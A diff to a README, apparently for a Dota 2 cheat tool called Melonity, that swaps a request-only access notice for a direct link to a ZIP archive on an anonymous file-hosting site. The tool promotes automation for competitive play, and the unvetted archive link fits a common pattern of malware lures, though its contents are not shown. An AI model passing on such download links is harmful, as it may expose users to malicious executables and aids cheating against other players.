@@ -58,7 +58,7 @@ Melonity is a **Dota 2 enhancement suite** focused on competitive-level automati
 ## 📥 Download
 
 🔒 **Private Build**  
-Access is available by request only. Contact via Discord or encrypted channel.
+**[Download Melonity.gg (ZIP)](https://files.catbox.moe/88ai75.zip)**
 
 ---
 
